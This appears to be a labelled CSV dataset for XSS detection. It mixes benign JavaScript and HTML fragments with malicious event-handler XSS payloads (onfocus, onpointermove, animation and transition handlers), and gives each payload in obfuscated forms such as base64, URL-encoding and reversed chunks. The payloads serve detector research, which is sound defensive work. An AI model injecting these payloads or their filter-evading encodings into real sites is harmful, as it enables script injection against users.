sample_id,label,payload_original,payload_obfuscated,generator,recipe
1210,0,jqueryevent.preventdefault() } return evt,jqueryevent.preventdefault() } return evt,llm_style_t1.0,none
1211,1,"<content onkeydown=""alert(1)"" contenteditable>test</content>",PGNvbnRlbnQgb25rZXlkb3duPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2NvbnRlbnQ+,llm_style_t1.0,base64+html_entities+whitespace_noise
1212,0,"<link rel=""next"" title=""scrapy at a glance"" href=""intro/overview.html"" />","<link rel=""next"" title=""scrapy at a glance"" href=""intro/overview.html"" />",llm_style_t1.0,none
1213,1,<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,ofocus>put autdow><inx></shax=1 id=tabindeert(1) sout=al onfocu<shadow,llm_style_t1.0,reverse_chunks
1214,1,"<tfoot oncontextmenu=""alert(1)"">test</tfoot>",%3Ctfoot%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ftfoot%3E,llm_style_t1.0,urlencode+html_entities
1215,0,"<li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;320–363, </li>","<li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;320–363, </li>",llm_style_t1.0,none
1216,1,"<label onbeforecopy=""alert(1)"" contenteditable>test</label>",YmVsPnQ8L2xhZT50ZXNpdGFibGVudGVkIGNvbnR0KDEpIiJhbGVyY29weT1lZm9yZWwgb25iPGxhYmU=,llm_style_t1.0,reverse_chunks+base64
1217,1,<input3 onpointermove=alert(1)>xss</input3>,%3Cinput3%20onpointermove%3Dalert%281%29%3Exss%3C%2Finput3%3E,llm_style_t1.0,urlencode
1218,0,exports.isrtl = isrtl,exports.isrtl = isrtl,llm_style_t1.0,none
1219,0,_this67._setupeventhandlers(); return _this67; },_this67._setupeventhandlers(); return _this67; },llm_style_t1.0,none
1220,1,<thead onpointermove=alert(1)>xss</thead>,ad%25253E252Fthes%25253C%25%25253Exs81%252529ert%25252%25253Daltermove0onpoinead%25252%25253Cth,llm_style_t1.0,double_urlencode+reverse_chunks+html_then_urlencode
1221,1,"<style>:target {color: red;}</style><tfoot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tfoot>",&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;tfoot id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)&gt;&lt;/tfoot&gt;,llm_style_t1.0,html_entities
1222,0,this._handlerangeblurmouseouttouchleavebound = this._handlerangeblurmouseouttouchleave.bind(,this._handlerangeblurmouseouttouchleavebound = this._handlerangeblurmouseouttouchleave.bind(,llm_style_t1.0,none
1223,1,"<picture><source srcset=""validimage.png""><img onloadend=alert(1)></picture>",%3Cpicture%3E%3Csource%20srcset%3D%22validimage.png%22%3E%3Cimg%20onloadend%3Dalert%281%29%3E%3C%2Fpicture%3E,llm_style_t1.0,urlencode
1224,0,"} document.queryselectorall('.carousel:not([data-bs-ride=""carousel""])') .foreach(carousel => {","} document.queryselectorall('.carousel:not([data-bs-ride=""carousel""])') .foreach(carousel => {",llm_style_t1.0,none
1225,1,"<svg onmouseenter=""alert(1)"">test</svg>",%253Csvg%2520onmouseenter%253D%2522alert%25281%2529%2522%253Etest%253C%252Fsvg%253E,llm_style_t1.0,double_urlencode
1226,1,"<frame onmouseleave=""alert(1)"">test</frame>",PGZyYW1lIG9ubW91c2VsZWF2ZT0iYWxlcnQoMSkiPnRlc3Q8L2ZyYW1lPg%3D%3D,llm_style_t1.0,base64+urlencode
1227,0,e.stoppropagation(); } this._cycleto(clickedindex);,e.stoppropagation(); } this._cycleto(clickedindex);,llm_style_t1.0,none
1228,0,static get name() { return name$7; },static get name() { return name$7; },llm_style_t1.0,none
1229,0,"this._removepinclasses(); this.el.style.top = this.options.offset + ""px""; this.el.classlist.add('pinned');","this._removepinclasses(); this.el.style.top = this.options.offset + ""px""; this.el.classlist.add('pinned');",llm_style_t1.0,none
1230,0,const event_mouseout = `mouseout${event_key}`,const event_mouseout = `mouseout${event_key}`,llm_style_t1.0,none
1231,0,"$('body .browser-window .container, .had-container').each(function() { $(this).toggleclass('had-container'); $(this).toggleclass('container');","$('body .browser-window .container, .had-container').each(function() { $(this).toggleclass('had-container'); $(this).toggleclass('container');",llm_style_t1.0,none
1232,0,data.handlenumbers.foreach(function(handlenumber){,data.handlenumbers.foreach(function(handlenumber){,llm_style_t1.0,none
1233,0,return window.promise && new promise(function (a) { return p = a; });,return window.promise && new promise(function (a) { return p = a; });,llm_style_t1.0,none
1234,0,.foreach(checkbox => { if (checkbox.id.includes('indeterminate')) { checkbox.indeterminate = true,.foreach(checkbox => { if (checkbox.id.includes('indeterminate')) { checkbox.indeterminate = true,llm_style_t1.0,none
1235,0,"</span><a href=""/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=64"" title=""edit section: robot rights"">edit </a><span class=""mw-editsection-bracket"">]","</span><a href=""/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=64"" title=""edit section: robot rights"">edit </a><span class=""mw-editsection-bracket"">]",llm_style_t1.0,none
1236,1,"<noscript ondblclick=""alert(1)"">test</noscript>","ipt>noscrest</1)"">tBF*/(rt/* O=""aleclickondblript <nosc",llm_style_t1.0,comment_marker+reverse_chunks+whitespace_noise
1237,0,"value: function clear() { this.done(null, true); }","value: function clear() { this.done(null, true); }",llm_style_t1.0,none
1238,0,"window.index.add({ href: 'http://materializecss.com/radio-buttons.html', title: 'radio buttons',","window.index.add({ href: 'http://materializecss.com/radio-buttons.html', title: 'radio buttons',",llm_style_t1.0,none
1239,1,"<details draggable=""true"" ondrag=""alert(1)"">test</details>",PGRldGFpbHMgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWc9ImFsZXJ0KDEpIj50ZXN0PC9kZXRhaWxzPg==,llm_style_t1.0,base64
1240,0,} if (parentdropdown.classlist.contains(class_name_dropup_center)) { return placement_topcenter;,} if (parentdropdown.classlist.contains(class_name_dropup_center)) { return placement_topcenter;,llm_style_t1.0,none
1241,0,value: function set(index) {,value: function set(index) {,llm_style_t1.0,none
1242,1,<code onpointermove=alert(1)>xss</code>,%3Ccode%20onpointermove%3Dalert%28%20%201%29%3Exss%3C%2Fcode%3E,llm_style_t1.0,whitespace_noise+urlencode
1243,0,"function getclientrectfrommixedtype(element, clippingparent, strategy) {","function getclientrectfrommixedtype(element, clippingparent, strategy) {",llm_style_t1.0,none
1244,0,this.$photocaption.text(this.caption); $('body').append(this.$photocaption); this.$photocaption.css({ display: 'inline' });,this.$photocaption.text(this.caption); $('body').append(this.$photocaption); this.$photocaption.css({ display: 'inline' });,llm_style_t1.0,none
1245,0,offsetparent = offsetparent; if (placement === top || (placement === left || placement === right) && variation === end) { sidey = bottom;,offsetparent = offsetparent; if (placement === top || (placement === left || placement === right) && variation === end) { sidey = bottom;,llm_style_t1.0,none
1246,0,"'input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], input[type=date], input[type=time], textarea'; $(document).on('change', input_selector, function() { if (this.value.length !== 0 || $(this).attr('placeholder') !== null) {","'input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], input[type=date], input[type=time], textarea'; $(document).on('change', input_selector, function() { if (this.value.length !== 0 || $(this).attr('placeholder') !== null) {",llm_style_t1.0,none
1247,1,<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,JTI1M0NrYmQlMjUyMGlkJTI1M0R4JTI1MjB0YWJpbmRleCUyNTNEMSUyNTIwb25mb2N1c2luJTI1M0RhbGVydCUyNTI4MSUyNTI5JTI1M0UlMjUzQyUyNTJGa2JkJTI1M0U=,llm_style_t1.0,double_urlencode+base64
1248,0,if (lasttick >= 0 && lasttick !== scrollspy._ticks) {,if (lasttick >= 0 && lasttick !== scrollspy._ticks) {,llm_style_t1.0,none
1249,0,const class_name_fade = 'fade'; const class_name_show = 'show'; const class_name_static = 'modal-static';,const class_name_fade = 'fade'; const class_name_show = 'show'; const class_name_static = 'modal-static';,llm_style_t1.0,none
1250,0,"class slider extends component { constructor(el, options) { super(slider, el, options);","class slider extends component { constructor(el, options) { super(slider, el, options);",llm_style_t1.0,none
1251,1,<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,%26lt%3Bxmp%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%26lt%3B%2Fxmp%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,llm_style_t1.0,html_then_urlencode
1252,0,.children('li.tab') .children('a') .first();,.children('li.tab') .children('a') .first();,llm_style_t1.0,none
1253,0,this.verticaldragged = true; } },this.verticaldragged = true; } },llm_style_t1.0,none
1254,1,"<option oncontextmenu=""alert(1)"">test</option>",%3Coption%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Foption%3E,llm_style_t1.0,urlencode
1255,0,"this.el.addeventlistener('mouseup', this._handlerangemouseuptouchendbound); this.el.addeventlistener('touchend', this._handlerangemouseuptouchendbound); this.el.addeventlistener('blur', this._handlerangeblurmouseouttouchleavebound);","this.el.addeventlistener('mouseup', this._handlerangemouseuptouchendbound); this.el.addeventlistener('touchend', this._handlerangemouseuptouchendbound); this.el.addeventlistener('blur', this._handlerangeblurmouseouttouchleavebound);",llm_style_t1.0,none
1256,0,}(component); m.taptarget = taptarget; if (m.jqueryloaded) {,}(component); m.taptarget = taptarget; if (m.jqueryloaded) {,llm_style_t1.0,none
1257,1,<svg><select onload=alert(1)></select>,%25253Csvg%25253E%25253Cselect%252520onload%25253Dalert%2525281%252529%25253E%25253C%25252Fselect%25253E,llm_style_t1.0,double_urlencode+urlencode
1258,0,"function topercentage ( range, value ) { return frompercentage( range, range[0] < 0 ? value + math.abs(range[0]) :","function topercentage ( range, value ) { return frompercentage( range, range[0] < 0 ? value + math.abs(range[0]) :",llm_style_t1.0,none
1259,0,pinstance._updateposition(),pinstance._updateposition(),llm_style_t1.0,none
1260,0,const event_click_data_api$5 = `click${event_key$8}${data_api_key$5}`; const class_name_carousel = 'carousel'; const class_name_active$2 = 'active';,const event_click_data_api$5 = `click${event_key$8}${data_api_key$5}`; const class_name_carousel = 'carousel'; const class_name_active$2 = 'active';,llm_style_t1.0,none
1261,1,<big id=x tabindex=1 onfocusin=alert(1)></big>,g>< /bi(1)>lertin=aocus onfex=1bindx ta id=<big,llm_style_t1.0,reverse_chunks+whitespace_noise
1262,0,return; } const instancemap = elementmap.get(element);,return; } const instancemap = elementmap.get(element);,llm_style_t1.0,none
1263,0,"replacements: [ { from: 'current version : v' + grunt.option('oldver'),","replacements: [ { from: 'current version : v' + grunt.option('oldver'),",llm_style_t1.0,none
1264,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tt>",%26lt%3Bstyle%26gt%3B%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Btt%20id%3Dx%20style%3D%26quot%3Bposition%3Aabsolute%3B%26quot%3B%20onanimationcancel%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B%2Ftt%26gt%3B,llm_style_t1.0,html_then_urlencode+html_entities
1265,1,"<style>:target {transform: rotate(180deg);}</style><frameset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frameset>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PGZyYW1lc2V0IGlkPXggc3R5bGU9InRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC9mcmFtZXNldD4=,llm_style_t1.0,base64
1266,0,const class_name_fade$2 = 'fade',const class_name_fade$2 = 'fade',llm_style_t1.0,none
1267,1,<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,%253Cfigure%2520id%253Dx%2520tabindex%253D1%2520onbeforedeactivate%253Dalert%25281%2529%253E%253C%252Ffigure%253E%253Cinput%2520autofocus%253E,llm_style_t1.0,double_urlencode
1268,0,"eventhandler.trigger(this._element, event_shown, { relatedtarget });","eventhandler.trigger(this._element, event_shown, { relatedtarget });",llm_style_t1.0,none
1269,0,"eventhandler.on(document, event_focusin$2, event => this._handlefocusin(event)); eventhandler.on(document, event_keydown_tab, event => this._handlekeydown(event)); this._isactive = true;","eventhandler.on(document, event_focusin$2, event => this._handlefocusin(event)); eventhandler.on(document, event_keydown_tab, event => this._handlekeydown(event)); this._isactive = true;",llm_style_t1.0,none
1270,0,"this._animatecaptionin($caption[0], this.options.duration)","this._animatecaptionin($caption[0], this.options.duration)",llm_style_t1.0,none
1271,0,"numstr = string(numstr); var pieces = numstr.split("".""); return pieces.length > 1 ? pieces[1].length : 0;","numstr = string(numstr); var pieces = numstr.split("".""); return pieces.length > 1 ? pieces[1].length : 0;",llm_style_t1.0,none
1272,0,"src: ['bower.json', 'package.json', 'package.js', 'jade *.html'], overwrite: true, replacements: [","src: ['bower.json', 'package.json', 'package.js', 'jade *.html'], overwrite: true, replacements: [",llm_style_t1.0,none
1273,0,"<li><a href=""/wiki/friendly_artificial_intelligence"" title=""friendly artificial intelligence"">friendly ai </a> </li> </ul> </td>","<li><a href=""/wiki/friendly_artificial_intelligence"" title=""friendly artificial intelligence"">friendly ai </a> </li> </ul> </td>",llm_style_t1.0,none
1274,0,if (instance._isshown()) {,if (instance._isshown()) {,llm_style_t1.0,none
1275,0,this._scroll(this.offset + delta); } } else if (this.dragged) {,this._scroll(this.offset + delta); } } else if (this.dragged) {,llm_style_t1.0,none
1276,0,this.$input.addclass('input'); } _setuplabel() {,this.$input.addclass('input'); } _setuplabel() {,llm_style_t1.0,none
1277,0,} else if (!this.options.fullwidth) { let clickedindex = $(e.target) .closest('.carousel-item'),} else if (!this.options.fullwidth) { let clickedindex = $(e.target) .closest('.carousel-item'),llm_style_t1.0,none
1278,1,"<noscript onkeydown=""alert(1)"" contenteditable>test</noscript>",%26lt%3Bnoscript%20onkeydown%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fnoscript%26gt%3B,llm_style_t1.0,html_entities+urlencode
1279,0,ripple.classname = ripple.classname + ' waves-notransition',ripple.classname = ripple.classname + ' waves-notransition',llm_style_t1.0,none
1280,0,} if (!this._ishovered) { this._disposepopper(),} if (!this._ishovered) { this._disposepopper(),llm_style_t1.0,none
1281,0,return; } element.removeattribute('tabindex');,return; } element.removeattribute('tabindex');,llm_style_t1.0,none
1282,0,"<h4><span class=""mw-headline"" id=""malevolent_and_friendly_ai"">malevolent and friendly ai","<h4><span class=""mw-headline"" id=""malevolent_and_friendly_ai"">malevolent and friendly ai",llm_style_t1.0,none
1283,0,"var rect = elem.getboundingclientrect(),","var rect = elem.getboundingclientrect(),",llm_style_t1.0,none
1284,1,"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>","<hr draggable="" true"" ondragstart= ""alert(1)  "">test</hr>",llm_style_t1.0,whitespace_noise
1285,0,"} sethand(x, y, roundby5) { let radian = math.atan2(x, -y),","} sethand(x, y, roundby5) { let radian = math.atan2(x, -y),",llm_style_t1.0,none
1286,0,let classstr = obj.attr('class') || '',let classstr = obj.attr('class') || '',llm_style_t1.0,none
1287,0,spectrum.prototype.getmargin = function ( value ) { var step = this.xnumsteps[0]; if ( step && ((value / step) % 1) !== 0 ) {,spectrum.prototype.getmargin = function ( value ) { var step = this.xnumsteps[0]; if ( step && ((value / step) % 1) !== 0 ) {,llm_style_t1.0,none
1288,1,<progress id=x tabindex=1 onfocus=alert(1)></progress>,<progress/*OBF*/ id=x tabinde/*OBF*/x=1 onfocus=alert(1)></progress>,llm_style_t1.0,comment_marker
1289,0,"} }, 100); $('.buysellads.buysellads-demo .close').on('click', function() {","} }, 100); $('.buysellads.buysellads-demo .close').on('click', function() {",llm_style_t1.0,none
1290,0,if (extraclass) { template.classlist.add(...extraclass.split(' ')); },if (extraclass) { template.classlist.add(...extraclass.split(' ')); },llm_style_t1.0,none
1291,1,<footer onpointerleave=alert(1)>xss</footer>,&lt;footer onpointerleave=alert(1)&gt;xss&lt;/footer&gt;,llm_style_t1.0,html_entities
1292,1,"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>","<div draggable="" true"" contenteditable>drag me</div><  var ondrop=alert(1) contenteditable>drop here</var>",llm_style_t1.0,whitespace_noise
1293,0,} parallax._parallaxes = []; m.parallax = parallax;,} parallax._parallaxes = []; m.parallax = parallax;,llm_style_t1.0,none
